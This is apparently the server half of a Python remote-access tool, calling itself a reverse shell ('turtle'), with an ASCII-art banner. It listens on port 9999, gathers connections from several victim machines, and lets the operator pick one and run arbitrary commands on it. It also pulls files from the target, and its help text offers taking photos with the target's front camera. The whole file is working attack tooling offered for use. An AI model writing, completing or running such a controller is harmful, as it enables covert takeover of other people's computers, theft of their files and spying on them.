import socket
import sys
import threading
import time
from queue import Queue

######################################################################################
##############################################################################################
def logo():
    #Here is the updated code:


    def print_doormat(width, height, text):
        # Print the top border
        print("***************______***************")
        print("*            /        \\            *")
        print("*           /          \\           *")

        # Print the text
        for i in range(height):
            if i == height // 2 - 1:
                print("*          /                      \\          *")
            elif i == height // 2:
                print("*          /  ***************  \\          *")
                print("*          /  *             *  \\          *")
                print("*          /  *  REVERSE   *  \\          *")
                print("*          /  *  SHELL     *  \\          *")
                print("*          /  *             *  \\          *")
                print("*          /  ***************  \\          *")
            elif i == height // 2 + 1:
                print("*          /                      \\          *")
            else:
                print("*         /                    \\         *")

        # Print the bottom border
        print("*        /                        \\        *")
        print("*       /                          \\       *")
        print("*______/____________________________\\_____ *")
        print("***************________***************")

        # Print the welcome message
        print("Welcome to", text)

    # Define the dimensions of the doormat
    width, height = 40, 13

    # Define the text to be printed on the doormat
    text = "Reverse Shell"

    # Print the doormat
    print_doormat(width, height, text)

    """
    When you run this code, it will output:


    ***************______***************
    *            /        \            *
    *           /          \           *
    *          /                      \          *
    *          /  ***************  \          *
    *          /  *             *  \          *
    *          /  *  REVERSE   *  \          *
    *          /  *  SHELL     *  \          *
    *          /  *             *  \          *
    *          /  ***************  \          *
    *          /                      \          *
    *         /                    \         *
    *        /                        \        *
    *______/____________________________\_____ *
    ***************________***************
    Welcome to Reverse Shell
    """




################################################################################################
###############################################################################################
def receive_file(client_socket, filename):
    """Receives a file over the socket."""
    try:
        filesize_str = client_socket.recv(1024).decode()
        filesize = int(filesize_str)

        if filesize == -1:
            print("File not found on server side.")
            return

        if filesize == -2:
            print("An error occurred during file transfer on the server.")
            return

        with open("received_" + filename, "wb") as f: # Save with "received_" prefix
            bytes_received = 0
            while bytes_received < filesize:
                chunk = client_socket.recv(4096)
                if not chunk:
                    break
                f.write(chunk)
                bytes_received += len(chunk)

        print(f"File '{filename}' received successfully.")

    except ValueError:
        print("Invalid file size received.")
    except Exception as e:
        print(f"An error occurred during file reception: {e}")


#############################################################################################
#############################################################################################

help1 = """1. list      ->   list all connections.
           2. select    ->   target a connection.
           3. help      ->   show all commands.
"""


help2 = """ 
You can run all cmd commands here.those all execute on target`s computer.And you also can use
these util-commands :-->
            1. get      ->   pull a file from target
            2. pik      ->   take a photo with target`s front camera.
            3.


"""



##############################################################################################
############################################################################################
NUMBER_OF_THREATS = 2
JOB_NUMBERS = [1,2]
queue = Queue()

all_connections = []
all_address = []

def creat_socket():
    try:
        global host
        global port 
        global s
        host = ""
        port = 9999
        s = socket.socket()


    except socket.error as err:
        print("Error : " + str(err))

def bind_socket():
    try:
        global host
        global port 
        global s

        print("Binding the port " + str(port))

        s.bind((host,port))
        s.listen(5)


    except socket.error as msg:
        print("socket binding error" + str(msg) + "\n" + "Retrying ....")
        bind_socket()


def accept_connection():
    # close all connections 
    for c in all_connections:
        c.close()


    del all_connections[:]
    del all_address[:]

    while True:
        try:
            conn,addr = s.accept()
            s.setblocking(1) # Prevense timeout during connecting...
            all_connections.append(conn)
            all_address.append(addr)
            
            print("connection stablished " +addr[0])
        except:
            print("Error Excepting connection")


# 1 FRIEND A
# 2 FRIEND B
# 3 FRIEND C
# turtle> command_here
# turtle> select 1


def start_turtle():
    logo()
    
    while True:
        cmd = input('turtle> ')
        if cmd == 'list':
            list_connection()
        elif 'select' in cmd:
            conn,addr = select_target(cmd)
            if conn is not None:
                send_target_command(conn,addr)
        elif cmd == 'help':
            print(help1)


        else:
            print("Command not recoginised")


def list_connection():
    result = ""
    for i,conn in enumerate(all_connections):
        try:
            conn.send(str.encode(' '))
            conn.recv(201480)
        except:
            del all_connections[i]
            del all_address[i]
            continue

        result = str(i) + " " + str(all_address[i][0] + " " + str(all_address[i][1]))

    print("-----Client-----\n" + result)


def select_target(cmd):
    try:
        target = cmd.replace('select ','')
        target = int(target)
        conn = all_connections[target]
        addr = all_address[target]
        print("you are now connected to : " + str(all_address[target][0]))
        print(str(all_address[target][0]) +">",end="")
        return conn,addr
    except:
        print("Selection not valid")
        return None
  
def send_target_command(conn,addr):
        
    while True:
        try:
            cmd = input()
            if cmd == "quit":
                break
            elif cmd == "help":
                print(help2)
                print(str(addr[0]) +"> ",end="")
            elif cmd[:3] == "get":
                conn.send(str.encode(cmd))
                receive_file(conn,cmd[4:])

            elif len(str.encode(cmd)) > 0:
                conn.send(str.encode(cmd))
                client_response =  str(conn.recv(2048),"utf-8")
                print( client_response,end="")
        except:
            print("Error sending commands")
            break




def create_workers():

    for _ in range(NUMBER_OF_THREATS):
        t = threading.Thread(target=work)
        t.daemon = True
        t.start()



def work():

    while True:
        x = queue.get()
        if x==1:
            creat_socket()
            bind_socket()
            accept_connection()
        if x==2:
            start_turtle()
        queue.task_done()


def create_job():

    for x in JOB_NUMBERS:
        queue.put(x)
    queue.join()

create_workers()
create_job()






